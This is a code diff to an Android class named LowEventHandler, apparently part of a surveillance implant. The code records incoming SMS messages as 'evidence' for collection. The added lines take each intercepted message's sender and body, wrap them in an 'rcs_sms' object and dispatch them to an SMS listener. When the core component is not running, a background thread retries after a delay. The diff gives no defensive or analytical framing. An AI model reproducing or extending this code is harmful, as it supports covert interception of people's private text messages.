@@ -4,10 +4,14 @@ import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
 import android.telephony.SmsMessage;
 import android.util.Log;
+
+import com.android.dvci.Core;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
+import com.android.dvci.listener.ListenerSms;
 import com.android.dvci.module.ModuleMessage;
+import com.android.dvci.module.message.Sms;
 import com.android.mm.M;
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
@@ -170,6 +174,23 @@ public class LowEventHandler implements Runnable {
 						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, WChar.getBytes("empty message"), new Date(date));
 					}else{
 						EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body, new Date(date));
+					}
+					boolean isCoreRunning = Core.iSR();
+					final Sms rcs_sms = new Sms(sms.getOriginatingAddress(), sms.getMessageBody().toString(),System.currentTimeMillis());
+					if (isCoreRunning) {
+						ListenerSms.self().internalDispatch(rcs_sms);
+					}else{
+						Thread thread=new Thread(new Runnable() {
+							public void run() {
+								try {
+									Thread.sleep(5000);
+								} catch (InterruptedException e) {
+
+								}
+								ListenerSms.self().internalDispatch(rcs_sms);
+							};
+						});
+						thread.start();
 					}
 
 				}
